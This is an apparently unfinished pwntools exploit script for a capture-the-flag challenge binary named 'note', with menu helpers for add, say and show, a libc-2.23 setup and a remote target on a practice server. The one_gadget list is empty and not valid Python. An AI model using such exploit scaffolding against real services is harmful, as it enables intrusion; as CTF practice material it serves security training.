from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.23.so')

debug = 1

if debug:
    io = process('./note')
else:
    io = remote('node4.buuoj.cn',28880)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget= [, ,,]

def add(size,content):
    io.sendlineafter(b"choice: ",str(1))
    size = str(int(size,10))
    io.sendlineafter(b"size: ",size)
    io.sendafter(b"content: ",content)

def say(fmt,content):
    io.sendlineafter(b"choice: ",str(2))
    io.sendafter(b"say ? ",fmt)
    io.sendafter(b"? ",content)

def show():
    io.sendlineafter(b"choice: ",str(3))

